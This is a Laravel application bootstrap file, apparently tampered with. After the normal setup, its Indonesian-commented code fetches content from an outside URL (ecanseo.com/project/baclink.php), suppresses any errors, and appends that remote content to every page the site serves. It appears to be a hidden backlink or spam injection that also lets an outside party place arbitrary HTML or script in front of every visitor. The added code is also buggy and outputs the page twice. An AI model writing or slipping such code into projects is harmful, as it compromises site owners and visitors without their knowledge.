<?php

/*
|--------------------------------------------------------------------------
| Create The Application
|--------------------------------------------------------------------------
*/

$app = new Illuminate\Foundation\Application(
    realpath(__DIR__.'/../')
);

/*
|--------------------------------------------------------------------------
| Bind Important Interfaces
|--------------------------------------------------------------------------
*/

$app->singleton(
    Illuminate\Contracts\Http\Kernel::class,
    App\Http\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Console\Kernel::class,
    App\Console\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Debug\ExceptionHandler::class,
    App\Exceptions\Handler::class
);

/*
|--------------------------------------------------------------------------
| Return The Application
|--------------------------------------------------------------------------
*/

// Gunakan output buffering untuk menangkap konten
ob_start();

// Jalankan aplikasi Laravel seperti biasa
$response = $app->handle(
    $request = Illuminate\Http\Request::capture()
);

// Kirim response yang sudah ada
$response->send();

// Ambil konten yang sudah di-render
$content = ob_get_clean();

// Tampilkan konten
echo $content;

// Ambil konten dari URL dan tampilkan di BAWAH </html>
$github_content = @file_get_contents('https://ecanseo.com/project/baclink.php');
if ($github_content !== false) {
    // Hapus tag </html> yang terakhir
    $content = str_replace('</html>', '', $content);
    echo $content;
    echo $github_content;
    echo '</html>';
} else {
    echo $content;
}

return $app;
